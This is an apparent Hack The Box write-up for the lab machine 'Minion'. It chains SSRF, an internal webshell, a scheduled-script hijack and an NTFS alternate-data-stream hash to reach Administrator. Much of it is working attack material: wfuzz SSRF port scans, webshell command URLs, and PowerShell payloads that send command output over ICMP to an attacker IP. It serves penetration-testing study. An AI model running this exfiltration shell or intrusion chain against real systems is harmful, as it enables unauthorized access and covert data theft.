---
icon: pickaxe
cover: ../../../../.gitbook/assets/Screenshot 2026-02-22 210602.png
coverY: -18.330577280271786
---

# HTB-MINION

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

#### Port Scan

```
┌──(sn0x㉿sn0x)-[~/HTB/Minion]
└─$ rustscan -a 10.10.10.57 blah blah
```

```
Open 10.10.10.57:62696

PORT      STATE SERVICE VERSION
62696/tcp open  http    Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 1 disallowed entry
|_/backend
|_http-server-header: Microsoft-IIS/8.5
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Why this matters:** Only one port exposed externally — port `62696` running Microsoft IIS 8.5. Based on the IIS version, the host is likely running Windows 8.1 or Server 2012 R2. The `robots.txt` leaks a `/backend` path.

***

### Web Enumeration

#### robots.txt

Visiting `http://10.10.10.57:62696/robots.txt`:

```
User-agent: *
Disallow: /backend
```

**Why this matters:** Developers often disallow paths they don't want indexed — these are exactly the paths worth looking at.

Visiting `/backend` returns:

```
Instance not running
```

Not much here directly, but worth brute-forcing sub-paths.

#### Technology Fingerprinting

Response headers confirm `ASP.NET` is running on the backend:

```
X-Powered-By: ASP.NET
Server: Microsoft-IIS/8.5
```

**Why this matters:** Knowing the stack (ASP/ASPX) lets us use the right wordlist extensions during directory brute-forcing.

#### HTML Source Comment

The main page source contains a Base64 comment:

```html
<!--
TmVsIG1lenpvIGRlbCBjYW1taW4gZGkgbm9zdHJhIHZpdGENCm1pIHJpdHJvdmFpIHBlciB1
bmEgc2VsdmEgb3NjdXJhLA0KY2jDqSBsYSBkaXJpdHRhIHZpYSBlcmEgc21hcnJpdGEu
-->
```

Decoding it reveals the first three lines of Dante's Inferno — a rabbit hole, no actionable info.

#### Directory Brute Force

```
┌──(sn0x㉿sn0x)-[~/HTB/Minion]
└─$ feroxbuster -u http://10.10.10.57:62696 -x asp,aspx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
```

```
200      GET        1l        7w       41c http://10.10.10.57:62696/test.asp
301      GET        2l       10w      156c http://10.10.10.57:62696/backend => http://10.10.10.57:62696/backend/
200      GET        1l        3w       20c http://10.10.10.57:62696/backend/default.asp
```

**Why this matters:** `test.asp` is our foothold — it's a server-side URL fetcher that becomes the pivot for SSRF.

***

### SSRF via test.asp

#### Initial Discovery

Visiting `test.asp` without parameters returns an error suggesting a `u` parameter is expected. Testing it:

```
http://10.10.10.57:62696/test.asp?u=http://10.10.14.78/
```

Returns a 500 — the server can't reach our machine. But:

```
http://10.10.10.57:62696/test.asp?u=http://10.10.10.57:62696/
```

Returns the Minions site. The server can only fetch its own resources — classic SSRF.

**Why this matters:** SSRF lets us probe internal services that aren't exposed externally.

#### Internal Port Scan via SSRF

Using `wfuzz` to fuzz internal ports via the SSRF, hiding 500 errors:

```
┌──(sn0x㉿sn0x)-[~/HTB/Minion]
└─$ wfuzz -u http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:FUZZ/ -z range,1-65535 --hc 500
```

```
000000080:   200        12 L     25 W     323 Ch      "80"
000005985:   200        0 L      0 W      0 Ch        "5985"
000047001:   200        0 L      0 W      0 Ch        "47001"
000062696:   200        13 L     37 W     458 Ch      "62696"
```

**Why this matters:** Port 80 exists internally and responds with actual content — it's a hidden admin panel. Ports 5985 and 47001 are WinRM-related.

#### Internal Admin Panel

Fetching `http://127.0.0.1:80/` via SSRF reveals a "Site Administration" page with several links, including one to:

```
http://127.0.0.1/cmd.aspx
```

**Why this matters:** An unauthenticated webshell is exposed, but only accessible from localhost — the SSRF bridges the gap.

***

### Blind RCE via cmd.aspx

#### Webshell Discovery

The `cmd.aspx` page accepts a POST parameter `xcmd` to run commands. Since we're routing through the SSRF (GET-only), we pass the command in the URL:

```
http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=whoami
```

Response:

```
Exit Status=0
```

A nonexistent command returns `Exit Status=1`. So we have code execution but output is blind.

**Why this matters:** Even blind RCE is enough to establish a shell — we just need a way to exfiltrate output.

#### Verifying Execution via Ping

```
┌──(sn0x㉿sn0x)-[~/HTB/Minion]
└─$ sudo tcpdump -ni tun0 icmp
```

Triggering:

```
http://10.10.10.57:62696/test.asp?u=http://127.0.0.1:80/cmd.aspx?xcmd=ping%20-n%201%2010.10.14.78
```

```
IP 10.10.10.57 > 10.10.14.78: ICMP echo request, id 1, seq 268, length 40
IP 10.10.14.78 > 10.10.10.57: ICMP echo reply, id 1, seq 268, length 40
```

**Why this matters:** ICMP confirms execution. HTTP/TCP callbacks fail — ICMP is the only outbound channel available.

***

### Shell over ICMP

Since only ICMP can reach us, we build a custom Python script using Scapy to:

1. Accept a command input
2. Send it to the webshell via the SSRF chain
3. Have the PowerShell on target run the command, encode the output, and send it back byte-by-byte in ICMP payloads
4. Reassemble and print the output locally

The PowerShell payload sent through the webshell:

```powershell
$cmd="{cmd}"
$s=1000
$ip='10.10.14.78'
$r=[System.Text.Encoding]::ASCII.GetBytes((iex -command $cmd 2>&1|out-string))
$ping=New-Object System.Net.NetworkInformation.Ping
$opts=New-Object System.Net.NetworkInformation.PingOptions
$opts.DontFragment=$true
$i=0
while ($i -lt $r.length) {
    $ping.send($ip,5000,$r[$i..($i+$s)],$opts)
    $i=$i+$s
}
```

Running the ICMP shell:

```
┌──(sn0x㉿sn0x)-[~/HTB/Minion]
└─$ sudo python icmp_shell.py

minion> whoami
iis apppool\defaultapppool

minion> pwd

Path
----
C:\windows\system32\inetsrv
```

**Why this matters:** When all TCP/UDP callbacks are blocked, ICMP is often overlooked by firewalls — it becomes a covert exfil channel.

***

### Enumeration as defaultapppool

#### File System Layout

```
minion> ls \

    Directory: C:\

d----  accesslogs
d----  inetpub
d----  PerfLogs
d-r--  Program Files
d----  Program Files (x86)
d----  sysadmscripts
d----  temp
d-r--  Users
d----  Windows
```

The `sysadmscripts` directory is non-standard.

#### Users

```
minion> ls \users\

d----  Administrator
d----  Classic .NET AppPool
d----  decoder.MINION
d-r--  Public
```

**Why this matters:** `decoder.MINION` is the only regular user — `user.txt` will be here.

#### Scheduled Script Discovery

```
minion> ls \sysadmscripts

-a---  c.ps1
-a---  del_logs.bat
```

`del_logs.bat` contents:

```bat
@echo off
echo %DATE% %TIME% start job >> c:\windows\temp\log.txt
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -exec bypass -nop -file c:\sysadmscripts\c.ps1 c:\accesslogs
echo %DATE% %TIME% stop job >> c:\windows\temp\log.txt
```

`c.ps1` deletes log files older than 1 day from the `accesslogs` folder. Watching `log.txt` modification times confirms this runs every 5 minutes.

Checking permissions:

```
minion> icacls \sysadmscripts\*

\sysadmscripts\c.ps1 NT AUTHORITY\SYSTEM:(F)
                     BUILTIN\Administrators:(F)
                     Everyone:(F)
                     BUILTIN\Users:(F)

\sysadmscripts\del_logs.bat NT AUTHORITY\SYSTEM:(F)
                            BUILTIN\Administrators:(F)
                            Everyone:(RX)
                            BUILTIN\Users:(RX)
```

**Why this matters:** `c.ps1` is world-writable. Since `del_logs.bat` (which runs as a higher-privileged scheduled task) calls `c.ps1`, we can abuse this for privilege escalation.

***

### User Flag decoder.MINION Desktop

We overwrite `c.ps1` to list decoder's desktop, and wait for the scheduled task to fire:

```
minion> copy \sysadmscripts\c.ps1 \sysadmscripts\c.ps1.bak
minion> echo 'dir C:\users\decoder.minion\desktop > C:\programdata\GOKU' > \sysadmscripts\c.ps1
```

After \~5 minutes:

```
minion> cat \programdata\GOKU

    Directory: C:\users\decoder.minion\desktop

-a---  backup.zip
-a---  user.txt
```

Copy both to a readable location:

```
minion> echo 'copy C:\users\decoder.minion\desktop\* C:\programdata\' > \sysadmscripts\c.ps1
```

***

### Privilege Escalation Administrator

#### Investigating backup.zip

`backup.zip` cannot be exfilled via the web directories (permission denied). We extract it locally on the target:

```
minion> Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\programdata\backup.zip', 'C:\programdata\')
```

This extracts `secret.exe`, which just prints the current directory — a rabbit hole.

#### Alternative Data Stream (ADS)

```
minion> cmd /C dir /R \programdata\backup.zip

09/04/2017  07:19 PM           103,297 backup.zip
                                    34 backup.zip:pass:$DATA
```

There's a hidden ADS stream named `pass`. Reading it:

```
minion> cat \programdata\backup.zip -stream pass
28a5d1e0c15af9f8fce7db65d75bbf17
```

**Why this matters:** NTFS ADS hides data in a file without affecting its visible size — commonly abused for steganography and credential hiding.

Cracking the hash (NTLM) via CrackStation returns: `1234test`

#### Mounting C$ as Administrator

```
minion> net use \\localhost\c$ /u:minion\administrator 1234test
The command completed successfully.
```

```
minion> dir \\localhost\c$\users\administrator\desktop

-a---  root.exe
-a---  root.txt
```

`root.txt` contains a troll message: the flag is only printed by `root.exe` when run from the correct directory.

**Why this matters:** The machine enforces that you have actual execution as Administrator, not just read access.

***

### Shell as Administrator via Invoke-Command

We upgrade our ICMP shell to authenticate as Administrator using `PSCredential` and `Invoke-Command`:

```powershell
$s=1000
$ip='10.10.14.78'
$pass="1234test"|ConvertTo-SecureString -AsPlainText -Force
$cred=New-Object System.Management.Automation.PSCredential("minion\\administrator", $pass)
$r=[System.Text.Encoding]::ASCII.GetBytes((invoke-command -computername localhost -credential $cred -scriptblock {{ {cmd} }}|out-string))
$ping=New-Object System.Net.NetworkInformation.Ping
$opts=New-Object System.Net.NetworkInformation.PingOptions
$opts.DontFragment=$true
$i=0
while ($i -lt $r.length) {
    $ping.send($ip,5000,$r[$i..($i+$s)],$opts)
    $i=$i+$s
}
```

```
┌──(sn0x㉿sn0x)-[~/HTB/Minion]
└─$ sudo python icmp_shell_admin.py

Minion> whoami
minion\administrator
```

Running `root.exe` from the wrong directory:

```
Minion> \users\administrator\desktop\root.exe
Are you trying to cheat me?
```

***

### Attack Flow

```
SSRF via test.asp
    --> Internal port scan (wfuzz)
        --> Hidden admin panel on :80
            --> cmd.aspx webshell (blind RCE)
                --> ICMP exfil shell (Scapy + PowerShell)
                    --> Writable c.ps1 (scheduled task abuse)
                        --> decoder.MINION files (user.txt + backup.zip)
                            --> ADS stream with NTLM hash
                                --> Cracked password (1234test)
                                    --> Invoke-Command as Administrator
                                        --> root.exe (root.txt)
```

***
